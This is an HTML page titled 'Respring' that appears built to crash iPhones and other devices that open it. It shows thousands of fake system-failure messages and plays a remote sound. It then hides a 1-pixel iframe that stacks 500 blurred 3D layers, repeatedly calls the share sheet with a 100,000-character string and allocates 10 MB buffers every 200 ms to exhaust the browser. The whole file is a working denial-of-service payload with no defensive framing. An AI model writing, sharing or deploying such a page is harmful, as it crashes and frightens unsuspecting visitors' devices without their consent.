<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Respring</title>

<style>
body {
    background: #8b0000;
    color: #ffffff;
    margin: 0;
    padding: 0;
    overflow: hidden;
    font-family: monospace;
    display: flex;
    flex-wrap: wrap;
    gap: 4px;
    height: 100vh;
}

/* ===== ТЕКСТ ФИКС (ЧТОБ НЕ ПРОПАДАЛ) ===== */
.error-msg {
    font-size: 6px;
    opacity: 0.6;
    user-select: none;
    position: relative;
    z-index: 9999; /* ← важно */
}

/* ===== iframe НЕ ПЕРЕКРЫВАЕТ ЭКРАН ===== */
#respring-iframe {
    position: fixed;
    width: 1px;
    height: 1px;
    opacity: 0.01;
    pointer-events: none;
    z-index: -1;
}
</style>
</head>

<body>

<iframe id="respring-iframe"
sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>

<script>

/* ===================== AUDIO ===================== */

const audioUrl =
"https://raw.githubusercontent.com/VityaIG/vityaig.github.io/main/otkat.mp3";

let ctx, buffer, played = false;

async function initAudio() {
    if (!ctx) {
        ctx = new (window.AudioContext || window.webkitAudioContext)();
    }

    if (!buffer) {
        const res = await fetch(audioUrl);
        const arr = await res.arrayBuffer();
        buffer = await ctx.decodeAudioData(arr);
    }
}

function playSound() {
    if (!buffer || played) return;

    const source = ctx.createBufferSource();
    const gain = ctx.createGain();

    source.buffer = buffer;

    const t = ctx.currentTime;
    gain.gain.setValueAtTime(0.0001, t);
    gain.gain.exponentialRampToValueAtTime(1, t + 0.01);

    source.connect(gain).connect(ctx.destination);
    source.start();

    played = true;
}

async function startAudio() {
    try {
        await initAudio();
        if (ctx.state === "suspended") await ctx.resume();
        playSound();
    } catch(e) {}
}

window.addEventListener("load", () => {
    startAudio();
});

function unlock() {
    startAudio();
}

document.addEventListener("click", unlock, { once:true });
document.addEventListener("touchstart", unlock, { once:true });
document.addEventListener("pointerdown", unlock, { once:true });


/* ===================== ТЕКСТ (СНАЧАЛА РЕНДЕРИМ) ===================== */

const errorTemplates = [
"Fatal Error 0x3333",
"Entering Bootloop...",
"KERNEL_PANIC",
"STACK_COLLISION",
"SYSTEM_FREEZE",
"HARDWARE_MALFUNCTION"
];

for (let i = 0; i < 3000; i++) {
    const span = document.createElement("span");
    span.className = "error-msg";
    span.innerText = errorTemplates[Math.floor(Math.random() * errorTemplates.length)];
    document.body.appendChild(span);
}


/* ===================== RESPRING (ТВОЙ КОД 1:1) ===================== */

window.onload = function() {
    setTimeout(() => {
        const frame = document.getElementById('respring-iframe');

        const respringScript = `
            <html>
            <body style="margin:0; overflow:hidden;">
                <script>
                    const container = document.createElement('div');
                    container.style.cssText =
                        'perspective: 1px; perspective-origin: 9999999% 9999999%;';
                    document.body.appendChild(container);

                    for (let i = 0; i < 500; i++) {
                        let d = document.createElement('div');
                        d.style.cssText =
                            'position: absolute; width: 100vw; height: 100vh;' +
                            'backdrop-filter: blur(40px); -webkit-backdrop-filter: blur(40px);' +
                            'transform: translate3d(100000px, 100000px,' + i + 'px) rotateY(90deg);' +
                            'opacity: 0.99;';
                        container.appendChild(d);
                    }

                    setInterval(() => {
                        try {
                            navigator.share({ title: 'R', text: 'R'.repeat(100000) });
                        } catch(e) {}

                        let x = new Uint8Array(1024 * 1024 * 10);
                        crypto.getRandomValues(x);
                    }, 200);
                <\/script>
            </body>
            </html>
        `;

        frame.srcdoc = respringScript;

    }, 850);
};

</script>

</body>
</html>
